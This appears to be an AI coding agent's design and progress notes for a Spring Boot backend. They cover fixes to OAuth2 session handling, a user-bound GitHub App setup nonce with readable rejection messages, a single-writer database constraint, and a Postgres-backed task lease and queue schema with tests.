-`known-gaps.md` entry already ranked highest-value — *"no test boots the packaged application"* —
-producing its fourth finding.
-
-## Change — one commit
-
-**1. Stop persisting the OAuth2 authentication** (`githublogin/internal/SecurityConfig.java`)
-
-Add `.securityContext(sc -> sc.securityContextRepository(new NullSecurityContextRepository()))`.
-Keep `SessionCreationPolicy.IF_REQUIRED`: the handshake still needs a session for the authorization
-request, which `HttpSessionOAuth2AuthorizationRequestRepository` holds under a *different* attribute
-and is unaffected. `STATELESS` would break the handshake — the existing comment says so and is right.
-
-**2. Stop retaining the GitHub token** (same file, plus one small class)
-
-New package-private `githublogin/internal/DiscardedGithubUserTokens.java` implementing
-`OAuth2AuthorizedClientRepository` with three no-ops (`@Nullable` on the load return, matching the
-project's existing jspecify usage). There is no built-in null implementation. Wire it in the DSL:
-
-```java
-.oauth2Login(oauth2 -> oauth2.userInfoEndpoint(userInfo -> userInfo.userService(oauth2UserService))
-        .authorizedClientRepository(new DiscardedGithubUserTokens())
-        .successHandler(issueForgeSession()))
-```
-
-`OAuth2LoginConfigurer.authorizedClientRepository` sets the shared object, so it beats Boot's
-autoconfigured repository without touching autoconfiguration. Preferred over a `@Bean` override
-because it sits where a reviewer of the login flow will actually look — beside `userInfoEndpoint`
-and `successHandler`. Prevents the write rather than cleaning up after it, and makes §6 true.
-
-**3. Delete the guard** (`githublogin/internal/ForgeStackSessionAuthenticationFilter.java`)
-
-**Revised.** The earlier wording — change the guard to "not already a `ForgeStackPrincipal`" and
-clear foreign authentication on `/api/**` — was wrong twice over.
-
-*Wrong to keep any guard:* with step 1 in place nothing populates the context before this filter
-(`AnonymousAuthenticationFilter` runs after it), so there is nothing to defer to. Simply delete the
-`if (...getAuthentication() == null)` branch. That removes the exact line the NPE traces back to,
-and with it the silently-do-nothing failure mode.
-
-*Wrong to put path logic here:* "on `/api/**` only" is an authorization concern, and an
-authentication filter that knows about URL patterns is the second copy of a rule that already has a
-home. It goes in step 4 instead.
-
-*Also rejected: making the cookie merely take **precedence**.* That leaves the OAuth2 session as a
-fallback authenticator whenever the cookie is absent, expired, or revoked — which would quietly
-break the promise in this filter's own javadoc that revocation "takes effect on the next request".
-A browser holding `JSESSIONID` would stay logged in after `SessionService.revoke`.
-
-Safe with respect to the callback either way: `AbstractAuthenticationProcessingFilter` does not
-continue the chain after a successful authentication, so this filter never runs on
-`/login/oauth2/code/github`.
-
-**4. Require a ForgeStack principal at the authorization layer** (`SecurityConfig`)
-
-Replace `.requestMatchers("/api/**").authenticated()` with `.access(forgeStackPrincipalRequired())`
-— a private static `AuthorizationManager<RequestAuthorizationContext>` helper in the same class, in
-the style of the existing `issueForgeSession()`. `authenticated()` is precisely the predicate that
-an `OAuth2AuthenticationToken` satisfied on its way to a null principal; this states what the seven
-endpoints actually need.
-
-Steps 1 and 4 overlap deliberately. 1 removes today's cause; 4 makes the invariant
-**authenticated ⟺ `ForgeStackPrincipal`** hold at the gate even if something later repopulates the
-context — turning a future recurrence into a 403 instead of a 500 in seven places at once.
-
-Preserves the behaviour documented in §1.5: an anonymous caller still yields a false decision, so
-`ExceptionTranslationFilter` still calls the entry point and `/api/session` still 302s to
-`/oauth2/authorization/github`.
-
-**Not doing:** null checks in the seven controllers, or `errorOnInvalidType = true` on each
-`@AuthenticationPrincipal`. With step 4 in place a null principal is unreachable, and seven
-defensive copies of one rule is the noise Appendix A argues against.
-
-## Test — extend `FakeGithub` to cover the login handshake
-
-Chosen scope: **the full flow**, because the fast variant stubs past the handshake that broke.
-
-`support/FakeGithub.java` currently serves only `/app/installations` and
-`/installation/repositories`. Add GitHub's OAuth endpoints — the access-token exchange and `/user`
-(plus `/user/emails`, per the `user:email` scope) — and point the provider at them in the test
-context via `spring.security.oauth2.client.provider.github.token-uri` and `user-info-uri`.
-`AbstractIntegrationTest` already has the `@DynamicPropertySource` hook.
-
-Mechanism: **MockMvc with one `MockHttpSession` passed to every request** — a faithful stand-in for
-a browser holding `JSESSIONID`, and explicit about the session surviving between requests, which is
-the whole bug. A `RANDOM_PORT` test with a real cookie jar has higher fidelity but needs hand-rolled
-cookie handling and a third `webEnvironment`, and buys nothing: the defect is entirely inside the
-servlet filter chain, which MockMvc runs for real.
-
-Put `@AutoConfigureMockMvc` and the two provider overrides on **`AbstractIntegrationTest`**, not the
-new class: it holds the test-context count at two (`AbstractGithubAppTest`'s javadoc is explicit
-about not wanting silent context proliferation) and makes "no test can reach github.com" a property
-of the base class rather than of each test remembering.
-
-Overriding only `token-uri` and `user-info-uri` is deliberate — `OAuth2ClientPropertiesMapper`
-starts from `CommonOAuth2Provider.GITHUB` and overlays, so `user-name-attribute: id`, the
-authorization URI and `CLIENT_SECRET_BASIC` all survive.
-
-The authorization endpoint is never called: the test reads `state` out of the `Location` header of
-`GET /oauth2/authorization/github` and calls the redirect URI itself.
-
-New test, `githublogin/LoginSessionIntegrationTest`, driving the real chain:
-
-| # | Assertion | Now | After | Pins |
-|---|---|---|---|---|
-| 1 | Callback issues a `forge_session` cookie | passes | passes | the handshake still works |
-| 2 | `GET /api/session` with session **and** cookie → 200, non-null `activeWorkspaceId` | **500** | 200 | the regression itself |
-| 3 | `GET /api/session` with session, **no** cookie → 302 | **500** | 302 | a servlet session is not a credential |
-| 4 | `revoke()`, then request with both → 302 | **500** | 302 | revocation immediacy, which the shadowing silently defeated |
-| 5 | `authorizedClientService.loadAuthorizedClient("github", login)` is null | **fails** | passes | §6's token claim |
-| 6 | `get("/api/session").with(oauth2Login())` → **403** | **500** | 403 | step 4's gate, and *only* that |
-
-**Two traps this table encodes, both found by checking rather than assuming:**
-
-- **Row 5 is not "nothing in the servlet session".** The token is in an in-memory
-  `OAuth2AuthorizedClientService`, not the session, so the session-shaped assertion would pass
-  without the fix and prove nothing.
-- **Row 6 cannot be made green by step 1.**
-  `SecurityMockMvcRequestPostProcessors.oauth2Login()` wraps the repository in a
-  `TestSecurityContextRepository` that prefers a request attribute over the delegate, so the token
-  reaches the holder even with `NullSecurityContextRepository` installed. That makes it a good test
-  of the step-4 gate and a useless test of step 1 — so rows 2–4 must **not** be built on it.
-
-**Watch rows 2–6 fail first**, per the `watch-guarantees-fail-first` memory. Land `FakeGithub`, the
-base-class change and the test class on the *unfixed* code, run, and record the actual failure text
-rather than predicting it — in particular whether MockMvc rethrows the NPE or renders a 500, since
-MockMvc performs no ERROR dispatch and may present the same defect differently from the browser.
-Only then apply the fix.
-
-## Files
-
-| File | Change |
-|---|---|
-| `githublogin/internal/SecurityConfig.java` | steps 1, 2, 4; rewrite the comment at 58-60 to name `HttpSessionOAuth2AuthorizationRequestRepository` as why `IF_REQUIRED` survives |
-| `githublogin/internal/DiscardedGithubUserTokens.java` | **new**, package-private, three no-ops |
-| `githublogin/internal/ForgeStackSessionAuthenticationFilter.java` | delete the guard at :38, add the *why* comment |
-| `githublogin/internal/ForgeStackOAuth2UserService.java` | amend the javadoc — the claim was true of this class and false of the running system |
-| `support/FakeGithub.java` | add `/login/oauth/access_token`, `/user`, `/user/emails` + a `githubUser(...)` helper mirroring `installation(...)` |
-| `support/AbstractIntegrationTest.java` | `@AutoConfigureMockMvc` + the two provider overrides |
-| `githublogin/LoginSessionIntegrationTest.java` | **new**, rows 1-6 |
-| `docs/known-gaps.md` | below |
-
-Nothing under `api/` changes. All seven endpoints are fixed by the filter chain.
-
-## Verification
-
-- `./gradlew test` — **67 → 73**, all green. Every pre-existing test must be untouched; this is a
-  security-chain change, and movement elsewhere means the chain shifted more than intended.
-- Manual, the real proof: log in via browser, then `GET /api/session` returns 200 with a non-null
-  `activeWorkspaceId` instead of a Whitelabel page. **That unblocks Task C**, which then runs
-  unchanged.
-- After login, assert the authorized-client service is empty and grep the log for the access token.
-
-## Then update `docs/known-gaps.md`
-
-New **§1.8** recording the shadowing bug and the §6 token-retention correction, quoting the observed
-first-run failures the way §1.1 quotes `"Expecting code to raise a throwable"`.
-
-Entries that stay **open**:
-
-- **The category lesson, beside §1.2b.** This bug is invisible to `curl`: it needs a client holding
-  `JSESSIONID` *and* `forge_session` at once. The entire §7 checklist is curl-shaped and would have
-  passed end to end. *Anything that only manifests when the client keeps state is invisible to a
-  stateless check* belongs next to *anything the suite does not touch is unverified*.
-- **§1.5, vindicated.** That entry already warns this file records beliefs, after one was written
-  from reading config instead of running it. `SecurityConfig:58-60` was the same mistake in
-  production code: a comment describing intent is a belief, not an enforcement. Second instance in
-  the same file's blast radius.
-- **§5, carefully.** "No HTTP-layer tests" is now *partly* closed — one class covers login→API — but
-  the other six endpoints have no status-code or JSON coverage, and **"no test boots the packaged
-  application" stays fully open**: MockMvc overrides configuration and never starts the packaged
-  app. Say so, so nobody reads this task as having closed the table's top entry.
-- **New:** `ForgeStackSessionAuthenticationFilter` is a `@Component` implementing `Filter`, so Boot
-  registers it as a container-level servlet filter *in addition* to its place in the security chain.
-  Benign only because the chain has precedence `-100` and `OncePerRequestFilter` suppresses the
-  second call — but it is the same shape as the bug just fixed: a second copy of an authentication
-  mechanism running outside the chain. Fix is a `FilterRegistrationBean` with `setEnabled(false)`,
-  or dropping `@Component` and constructing it in `SecurityConfig`. **Recorded, not folded in**, to
-  keep this diff reviewable.
-
-## Two defaults I chose without you
-
-`AskUserQuestion` failed twice with a stream error, so these are taken as the recommended options —
-say the word at approval and either flips:
-
-1. **Scope: all four steps**, rather than the core fix alone. The token retention and the missing
-   gate are both one-line-ish given the file is already open, and both are things this task
-   *discovered*; deferring them means re-deriving the context later.
-2. **Sequencing: tests first**, watched failing, before the fix. This delays your App install by the
-   time it takes to build the `FakeGithub` OAuth endpoints. The argument for paying it: this bug is
-   invisible to every check we currently run, so without the test nothing would catch a recurrence —
-   and it is the fourth finding from running rather than testing the app.
-
----
-
-# Task E — the setup nonce is too brittle, and its failure is unreadable
-
-## Context
-
-With Task D in, the install flow ran for real: `/api/installations/start` redirected to GitHub, the
-App was installed, and GitHub returned the browser to the Setup URL. **The Setup URL is correct and
-the App is installed** — `GET /app/installations` now reports one installation:
-
-```
-id=153999617  account=QL-Tushar-Kumar  type=User  accountId=213618763  selection=all
-```
-
-`accountId` matches `user_identities.provider_user_id` exactly, so the anti-hijack ownership check
-would have passed. The binding still failed, and the browser showed *"This page is not working"*:
-
-```
-WARN  InstallationBindingService : Rejected GitHub installation binding:
-      installation=153999617 reason=INVALID_SETUP_STATE
-```
-
-### Two defects, one of which hid the other
-
-**1. The nonce is bound to a session id, and sessions churn.** `InstallationSetupNonces.issue`
-stores `sessionId` and `completeSetup` requires the callback to arrive on that same session. The
-`sessions` table shows three logins inside ten minutes — `bac56f25` (13:40, last used **18:33:26**,
-the callback), `75f64547` (**18:25:30**), `6a7e9cbf` (18:35:48) — so the flow straddled two of them.
-The GitHub install screen takes minutes, and the docs actively send a first-time user off to check
-their Setup URL mid-flow, so re-authenticating inside the window is ordinary, not exotic.
-
-**2. `INVALID_SETUP_STATE` cannot be diagnosed, and its own javadoc says so:** *"No such nonce,
-already used, expired, or issued to a different session."* Four causes, one enum value, one WARN
-line, one audit row. This is exactly the §1.1 pattern — a 401 and a 404 collapsed into one
-indistinguishable outcome — recurring in a different module.
-
-That second defect is why the root cause here is still **undetermined**. The browser holds exactly
-one `forge_session` cookie (checked), which should make a session mismatch impossible; yet
-`last_seen_at` proves session A served the callback while session B was current. Either the nonce
-had simply expired past its 15-minute TTL, or something authenticated as an older session. **The
-system did not record enough to tell**, and no amount of further inspection now will recover it. The
-fix is to make the next occurrence self-explanatory rather than to keep guessing at this one.
-
-**3. The callback returns an empty body.** `InstallationController.callback` answers every rejection
-with `ResponseEntity.status(...).build()`. GitHub redirects a *real browser* here, so a bare 400
-renders as Chrome's "This page is not working" — the user is told nothing at all. The javadoc's
-"acceptable while there is no browser client" is no longer true: this endpoint's only caller *is* a
-browser.
-
-## Change
-
-**1. Bind the nonce to the user, not the session** (`githubinstallation/internal/installation/InstallationSetupNonces.java`,
-`InstallationBindingService.completeSetup`)
-
-Store `userId`; compare against the caller's `userId`. Decided with the user.
-
-The nonce's job, per its own javadoc, is that "a third party cannot cause someone else's browser to
-complete an install flow it never began". User granularity satisfies that exactly — an attacker
-cannot mint a nonce for someone else's account without being logged in as them. *Same human,
-different session* was never the threat. The ownership check against the GitHub account id is
-untouched and still independently blocks id substitution, which is the attack the nonce was never
-able to stop anyway.
-
-Single use stays. `InstallationController.start` passes `principal.userId()` instead of
-`principal.sessionId()`.
-
-**2. Raise the TTL to 30 minutes.** Fifteen assumes the user goes straight to GitHub and back. The
-real flow includes reading GitHub's permission screen and picking repositories, and `local-setup.md`
-tells a first-timer to verify their Setup URL on the way. The nonce is single-use and now
-user-bound; a leaked link that goes stale in 30 minutes rather than 15 is not a meaningfully
-different exposure.
-
-**3. Split the rejection reason so the server can tell what happened**
-(`InstallationBindingResult.Reason`, `InstallationSetupNonces.consume`)
-
-`consume` returns enough to distinguish *absent* from *foreign*. Two reasons replace one:
-
-| Reason | Means | Caller sees |
-|---|---|---|
-| `SETUP_STATE_EXPIRED` | no such nonce — expired, already used, or never issued | 400, **explained** |
-| `SETUP_STATE_FOREIGN` | a live nonce belonging to another user | 400, explained the same way |
-
-Both render identically to the caller and are distinct in the log and the `audit_events` row. Unlike
-§1.1's 403/404 pair there is no oracle concern in telling a user their *own* setup link expired, so
-the message can be genuinely helpful; a foreign nonce is the one worth alerting on, and it is now
-greppable.
-
-**4. Give the callback a body** (`api/installation/InstallationController.java`)
-
-A rejection returns a short `text/plain` explanation and what to do — "This setup link has expired.
-Start again from /api/installations/start." Still the same status codes. The ownership rejections
-(`UNKNOWN_INSTALLATION`, `NOT_YOUR_ACCOUNT`) keep a single shared wording, because §7 requires them
-to stay indistinguishable.
-
-## Not doing
-
-- **`ForgeStackSessionCookie.read` uses `findFirst()`** on the cookie list, so duplicate
-  `forge_session` cookies would be resolved arbitrarily. It was the leading theory until the cookie
-  count came back as 1. No evidence it is real → `known-gaps.md` entry, not speculative code.
-- **The nonce is still consumed before the ownership check**, so a rejection burns it. Single use is
-  the security property; with a readable error the user now knows to restart.
-
-## Test
-
-Extend `githubinstallation/InstallationBindingServiceTest` (which already covers nonce reuse,
-foreign nonce, and absent nonce against the session-bound behaviour — those assertions move to the
-user-bound equivalent):
-
-| Assertion | Pins |
-|---|---|
-| A nonce issued in one session completes in **another session of the same user** | the actual regression — this is the flow that just failed |
-| A nonce issued to a **different user** is rejected as `SETUP_STATE_FOREIGN` | CSRF protection survives the loosening |
-| A consumed nonce is rejected as `SETUP_STATE_EXPIRED` | single use |
-| An absent nonce is `SETUP_STATE_EXPIRED`, not `SETUP_STATE_FOREIGN` | the two are actually distinguished |
-
-The first must be **watched failing** before the change — it is the one that reproduces the user's
-failure, and per the standing rule a fix for a path never seen failing proves nothing.
-
-## Verification
-
-- `./gradlew test` — **74 → ~77**, green, with `LoginSessionIntegrationTest` untouched.
-- Manual, the real proof and the thing that unblocks Task C: visit
-  `http://localhost:8080/api/installations/start`. GitHub shows the configure page for the existing
-  installation `153999617`; approving returns to the callback with `setup_action=update`, which
-  `InstallationController` already handles identically to `install`. Expect a redirect, a
-  `github_installations` row, and an `INSTALLATION_BOUND` audit row.
-- Deliberately break it once: replay the same callback URL and confirm a readable
-  `SETUP_STATE_EXPIRED` page rather than "This page is not working".
-
-Then `known-gaps.md`: §1.9 for this, plus the `findFirst()` entry under §2, and tick the §7 items
-this run covers.
-
-## Progress and two late findings
-
-**Implementation is ~90% done and uncommitted**, sitting on `6234e78`. Done: nonce bound to
-`userId`, TTL 30 min, `Reason` split into `SETUP_STATE_EXPIRED` / `SETUP_STATE_FOREIGN`, controller
-returns a `text/plain` body, `beginSetup`/`completeSetup` shed the now-dead `sessionId` parameter,
-plus `support/BrowserLogin` extracted so `LoginSessionIntegrationTest` and the new
-`InstallationSetupFlowTest` share one OAuth handshake.
-
-Both new tests were **watched failing** on the unfixed code, with the user's exact symptoms:
-
-```
-an install survives the user logging in again ...  expected: 302 but was: 400
-a rejection explains itself ...                    Expecting not blank but was: ""
-a nonce from a different user is refused           PASS   (already strict enough)
-```
-
-Remaining: re-run the suite (last compile error in `RepositoryCatalogTest` is fixed but unverified),
-then `known-gaps.md`, then commit.
-
-### Finding: there is a second GitHub account in play
-
-The user logged in with a different GitHub account to test. This is not a red herring — it changes
-the guidance and slightly changes the fix.
-
-Installation `153999617` belongs to **`QL-Tushar-Kumar`** (`accountId 213618763`). The ownership
-check compares that against `user_identities.provider_user_id` of the *signed-in ForgeStack user*.
-So finishing the flow signed in as the other account is refused with `NOT_YOUR_ACCOUNT` — correctly,
-and it is the same rejection an attacker would get.
-
-Binding the nonce to the user does **not** paper over this, and must not: switching accounts
-mid-flow is genuinely a different human as far as the check is concerned. What it does mean is that
-the rejection wording has to help, because "wrong GitHub account" and "expired link" are now both
-live possibilities for this user and both currently render as the same blank page.
-
-**Refinement to the messages** in `InstallationController.explain`: mention the account, without
-becoming the oracle §7 forbids. `NOT_YOUR_ACCOUNT` and `UNKNOWN_INSTALLATION` keep one shared
-wording that says to check which GitHub account is signed in — that reveals nothing about whether
-the installation exists. The setup-state pair likewise mentions that switching accounts invalidates
-a link.
-
-### Finding: a successful login looks like a failure
-
-Reported three times now as "redirected to whitelabel". It is not an error:
-`forgestack.security.login-success-redirect` defaults to `/`, nothing maps `/`, so **every
-successful login lands on Spring's Whitelabel 404.** The one signal the user gets from a working
-login is indistinguishable from a broken one.
-
-**Change the default to `/api/session`** (decided with the user). `SecurityConfig` reads it via
-`@Value("${forgestack.security.login-success-redirect:/}")`; only the default moves. After logging
-in the browser lands on its own session JSON — confirmation that it worked, plus *which account is
-signed in*, which is exactly the thing needed before starting an install. Update the §5 table in
-`docs/local-setup.md`, which documents the default as `/`.
-
-### Environment note
-
-Postgres, Redis and the app are all stopped (reboot). The `forge-backend_forgestack-pgdata` volume
-survived, so the existing user, sessions and audit rows come back with `docker compose up -d`. The
-GitHub-side installation is untouched and still present.
-
-## Revised verification
-
-1. `./gradlew test` — expect **74 → 78** green (three new flow tests, one new nonce test).
-2. `docker compose up -d && ./scripts/dev.sh`.
-3. Sign in **as `QL-Tushar-Kumar`** — the account that owns installation `153999617`. Landing on
-   `/api/session` should now show a non-null `activeWorkspaceId`; confirm `email`/`displayName` are
-   that account and not the other one.
-4. `/api/installations/start` → GitHub shows the configure page for the existing installation →
-   approve → expect a redirect and a `github_installations` row, not a blank page.
-5. Deliberately break it once: replay the callback URL and confirm a readable expired-link message.
-
-
-
-
-
-
-# Task F — one write owner per real repository
-
-**Status: implemented.** `V5__single_write_owner.sql`, `WriteOwnershipTest` (4 tests). Full suite
-80 → 84 green.
-
-## Context
-
-Asked whether Forge should move to "one repository → one workspace with WRITE authority, plus
-explicitly authorized READ/OBSERVE workspaces". Decided **yes**, and adopted only the write half
-now. Observation is designed but deliberately unbuilt.
-
-Three findings shaped that split.
-
-**The write case is stronger than coordination difficulty.** `github_action_log` is unique on
-`(workspace_id, fingerprint)` and is the ledger that stops a crash between "GitHub committed" and
-"we recorded it" from opening duplicate pull requests. A second writing workspace gets a *second*
-ledger, and neither can see the other's fingerprints — so the guarantee does not degrade, it stops
-applying, silently. That is a property already built and paid for, voided by a second writer.
-
-**The motivating case for observation does not need observation.** "Agent B reads `auth-service` to
-modify `payment-service`" is, in the common shape, two repositories on one account — same
-installation, same workspace — and is already solvable with two narrow tokens,
-`TokenScope.readOnly(...)` plus `TokenScope.contribute(...)`. Cross-workspace observation is only
-required once workspaces are deliberately split, which needs a shared-installation model that does
-not exist. Observation is therefore *downstream* of installation sharing, not an independent
-feature, and is unreachable today even if built.
-
-**Observation would open the first cross-tenant credential path.** Minting for repository X requires
-the installation that exposes X, which belongs to the owning workspace. Today no code can express
-one workspace reaching another's credentials, and that absence is a real safety property. Worth
-opening once, against a live requirement — not speculatively.
-
-## Change
-
-`managed_repositories` keyed maintenance on `github_repository_id`, a workspace-local UUID. Since
-V4 two workspaces hold *different* UUIDs for the same real repository, so a constraint there cannot
-see a cross-workspace collision. V5 adds `github_repo_id` and the invariant:
-
-```sql
-CREATE UNIQUE INDEX managed_repositories_single_writer
-    ON managed_repositories (github_repo_id)
-    WHERE status = 'ACTIVE';
-```
-
-Partial on `ACTIVE` deliberately: `PAUSED` and `ACCESS_LOST` release the claim, so a workspace that
-stopped maintaining a repository does not hold a global lock nobody else can see or appeal. The cost
-is that re-enabling can now fail because someone else claimed it — the correct visible outcome
-rather than two writers. `ManagedRepositoryService.enable` translates the constraint violation into
-`Optional.empty()`, matching how `InstallationBindingService` handles `installation_id`; the
-controller already renders that as 404 rather than 403 so as not to confirm the repository exists.
-
-**The migration has an RLS trap worth remembering.** `FORCE ROW LEVEL SECURITY` applies to the table
-owner, and migrations run as `forgestack_migrator` — the owner. With no `app.workspace_id` bound,
-both tables read as *empty*, so the backfill would quietly update nothing. Verified directly: the
-same count returns 0 with FORCE and 9 without. V5 lifts FORCE for the backfill and restores it
-immediately; Postgres DDL is transactional and Flyway runs each migration in one transaction, so a
-failure between those points rolls back the lift too.
-
-## Deliberately not done
-
-- `TokenScope` does **not** gain a `workspaceId`. It is unreachable today — no code path shares an
-  installation — so the field would be carried, hashed, and never exercised, which is the same
-  vacuity this project already flags in two ArchUnit rules. Guarded instead by the tripwire below.
-- No observer grant table, no read-only observer path, no cross-tenant minting.
-- No `repository_ownership` aggregate. The partial index expresses the invariant without inventing
-  one; promote it when transfer semantics need their own history.
-- Installation binding stays 1:1 for alpha.
-
-## Test
-
-`WriteOwnershipTest`. The setup builds a state GitHub cannot produce — two installations, two
-accounts, one repository — because that is precisely the state the constraint defends and it is
-otherwise unreachable. Watched failing first with the index commented out: the second workspace
-successfully obtained an `ACTIVE` claim on the same repository, twice over.
-
-The fourth test is a **tripwire**, not a behaviour test: it asserts `installation_id` is still
-uniquely constrained, and its failure message lists what must change alongside it — `TokenScope`'s
-fingerprint, `available()`'s tenancy assumption, and keying repository concurrency on
-`github_repo_id`. Dropping that constraint should hand the next engineer a checklist, not a green
-build.
-
-One flaw found while writing it: counting active writers with a single unscoped query always
-returned 0, because the app role is subject to RLS and holds no `BYPASSRLS`. Counting inside each
-tenant scope and summing is the honest form, and demonstrates the property that makes the constraint
-necessary — neither workspace can see the other's claim, so only the database can arbitrate.
-
-## Decided for Phase 2, nothing to change yet
-
-Repository concurrency must be keyed on **`github_repo_id`**, never on a `ManagedRepository` or
-`GithubRepository` UUID. Free to decide now because no locking code exists — not a lease, not a
-semaphore, not a stub. In a 1:1 world the two choices are indistinguishable, which is exactly why
-Phase 2 would otherwise pick the workspace-local one and be silently wrong once installations are
-shared.
-
-
-# Phase 2 — step 2.2: the task/attempt/step schema
-
-**Status: implemented.** `V7__task_model.sql`, `TaskModelSchemaTest` (7 tests). Suite 90 → 97 green.
-
-## Ordering — 2.2 before 2.1, deliberately
-
-The Phase 2 table lists `platform.jobs` (2.1) before the task schema (2.2). That order does not
-work. 2.1's exit criterion is *"`FLUSHALL` on Redis loses no work"*, and the durable copy the
-reconciler rebuilds from is `tasks.lease_owner / lease_epoch / lease_expires_at` — columns defined
-in 2.2. §5 says so directly: "`tasks.lease_expires_at` is the durable copy; reconciler reclaims".
-So the schema comes first, and 2.1 follows against something real rather than a toy job type.
-
-Noted rather than silently reordered, because the numbering is referenced elsewhere.
-
-## What landed
-
-`tasks`, `task_state_transitions`, `task_attempts`, `task_steps` — with RLS forced on all four, the
-scheduler and reconciler indexes from §4.4, and `task_state_transitions` revoked to append-only on
-the same terms as `audit_events`.
-
-**The exit criterion is `one_live_attempt_per_task`**, a partial unique index on
-`task_attempts(task_id) WHERE ended_at IS NULL`. Watched failing first with the index commented
-out: eight concurrent racers all opened an attempt, leaving eight live attempts on one task. That is
-the whole argument for the constraint — each racer read "no live attempt" and each was individually
-correct, and no check before the write closes that window.
-
-Three constraints beyond the plan's sketch, each guarding a shape that would quietly break something
-above it:
-
-- `task_attempts_ended_ck` — `(outcome IS NULL) = (ended_at IS NULL)`. A half-ended row releases the
-  single-writer slot while the attempt is still running.
-- `tasks_terminal_reason_ck` — only terminal states may carry a `terminal_reason`. `ABANDONED` and
-  `FAILED` mean different things operationally and both must say which.
-- `tasks_state_ck` — the twelve FSM states and no others, so `BLOCKED` cannot creep back in and
-  `RESUMED` cannot be mistaken for a state.
-
-## Deferred, with reasons
-
-- **`tool_calls`, `tool_results`, `evidence`, `plans`, `llm_invocations`, `human_interventions`.**
-  All of §4.4, none of it reachable until there is a runtime to write it. Arrives with the phase
-  that first needs it rather than as a speculative empty schema.
-- **Partitioning `task_steps`.** Against the plan's advice to set it up front. There are zero rows
-  and no observed access pattern, and partitioning now means carrying `created_at` through every
-  primary key. The cost the plan warns about is retrofitting onto a *large live* table; the trigger
-  is therefore volume, and V6's create-and-lock-down function is the pattern to reuse.
-
-## Next
-
-2.1 `platform.jobs` — outbox relay, Redis Streams queue, fenced leases, reconciler. Needs
-`spring-modulith-starter-jpa` added: only `-core` is on the classpath today, so the
-`event_publication` registry the plan relies on as the transactional outbox is not present.
-
-# Phase 2 — step 2.1: the queue, the outbox, and taking work back
-
-**Status: implemented.** `V8__event_publication.sql`, `V9__reconciler_backoff.sql`, `platform.jobs`
-(7 files), `task` (3 files), 23 tests. Suite 97 → 120 green. Verified live against the running app,
-not only Testcontainers.
-
-## Exit criteria, and what holds them up
-
-> *A trivial job survives `kill -9` and resumes; `FLUSHALL` on Redis loses no work.*
-
-Both are the same claim from two directions — Postgres is the only source of truth and Redis is a
-transport that may vanish at any moment — and both are asserted in `CrashRecoveryTest`.
-
-| Criterion | Test | Watched failing first by |
-|---|---|---|
-| A killed worker's task is reclaimed and requeued | `aKilledWorkerLosesItsTask` | making `reclaimLapsedLeases` return nothing |
-| A stalled worker cannot write after being replaced | `aReusedWorkerNameDoesNotInheritTheClaim` | dropping `AND lease_epoch = ?` from `renew`/`release` |
-| `FLUSHALL` loses no work | `flushingRedisLosesNoWork` | making `findStrandedQueuedTasks` return nothing |
-| A rolled-back transaction queues nothing | `aRolledBackIntentIsNeverRelayed` | swapping `@ApplicationModuleListener` for `@EventListener` |
-| An undelivered job is still owed | `undeliveredWorkOutlivesTheOutage` | the same swap |
-| A flushed consumer group is rebuilt | `aFlushedGroupIsRebuilt` | removing the `NOGROUP` recovery |
-
-**One of those neutralisations passed, and that was the useful one.** Removing the epoch predicate
-from `renew` did not fail the fencing test, because reclaiming also clears `lease_owner` and the
-owner check alone covered for it. The epoch only earns its place when the owner string is *reused* —
-a restarted pod comes back under the same name — so the test was rewritten around that case and the
-neutralisation then failed properly. The original test would have let someone delete fencing and
-keep a green suite.
-
-## Three deviations from the plan, each with a reason
-
-**1. Leases and the reconciler live in `task`, not `platform.jobs`.** The plan puts them in platform
-beside the queue. Fencing is why they moved: a stalled worker is stopped by making its write
-conditional on the epoch *in the row it is writing*. A predicate against a separate lease table is
-not the same guarantee — Postgres re-checks a concurrently updated row against the `WHERE` clause,
-but it does not re-run a subquery against a lease table that moved on meanwhile. So the epoch belongs
-on `tasks`, and whatever owns `tasks` owns the lease. Reconciliation followed for a second reason
-below. `platform.jobs` keeps what is genuinely domain-free: the queue, the outbox relay, the leader
-lock.
-
-The alternative — a `LeaseReclaimer` port in platform implemented by `task` — was written out and
-rejected. It would have been an interface with exactly one production implementation whose only
-justification was the module diagram, which is the abstraction-without-pressure this project bans in
-Appendix A.
-
-**2. No Redis copy of the lease.** §5 lists `forge:lease:task:{id}` alongside the durable columns.
-Dropped: lease operations are one acquire plus a heartbeat every 15s per *running task*, so the
-Redis copy buys no measurable latency and adds a second place for the truth to live. Postgres also
-answers the clock-skew concern §21 raises more directly than Redis TTLs do — expiry is decided by
-the same clock that wrote the expiry, so no two hosts have to agree on the time. This makes "losing
-Redis costs latency, not correctness" straightforwardly true rather than something to be careful
-about.
-
-**3. Reconciliation iterates workspaces.** Row-level security has no all-tenants mode for this
-application by design: `forgestack_app` is not `BYPASSRLS`, so a cross-tenant scan returns zero rows
-however it is written. The sweep therefore takes `IamQueries.activeWorkspaceIds()` and enters each
-scope in turn. That is a real per-sweep cost and the honest price of an isolation guarantee the
-application cannot escape even when its own code is wrong. **Revisit when one sweep stops fitting
-comfortably inside its interval** — the shape that replaces it is a workspace-agnostic index of
-outstanding leases, not a wider grant.
-
-## What the reconciler rescues, and why it is two things
-
-`state = 'RUNNING'` with a lapsed lease is a worker that died. `state = 'QUEUED'` for longer than a
-grace period is what a *lost message* looks like from the database's side — the row still says
-queued and the message it refers to no longer exists anywhere. §5 says "state=QUEUED **or** lease
-expired" for exactly this reason. The grace period exists because there is no way to tell "the
-message was lost" from "no worker has got to it yet" except by waiting, which is also why
-re-queueing has to be harmless and every consumer has to be idempotent.
-
-Reclaiming writes a `task_state_transitions` row in the same transaction as the state change, so the
-schema's claim that every state change has exactly one transition row is true from the first day
-rather than from whenever 2.3 lands. A transition log with holes in it answers nothing, and the holes
-would be precisely the incidents anyone goes looking for.
-
-### The defect the live run found
-
-The first version had no memory of having re-queued anything, so a task nobody had capacity for
-looked lost on *every* sweep. Watching the real app for four minutes with one stranded task on it
-produced **eight copies of the same message** — one per sweep, and it would have continued
-indefinitely. The suite was green throughout: duplicates are safe by design, every test asserted the
-task *was* queued, and nothing asserted how often.
-
-Duplicates being harmless is exactly what made this easy to miss and wrong to leave. Queue depth is
-the number an operator reads to answer "are we behind", and §5's own advice — alert on outbox age,
-not just queue depth — assumes depth still means something.
-
-`V9__reconciler_backoff.sql` adds `tasks.requeued_at` and the reconciler skips anything re-queued
-within a grace period, bounding it to one message per grace period instead of one per sweep. Kept
-separate from `state_entered_at` deliberately: re-queueing is not a state change, and folding it in
-would reset "how long has this been QUEUED" on precisely the tasks worth noticing. `reQueueingBacksOff`
-covers it, watched failing first by removing the predicate.
-
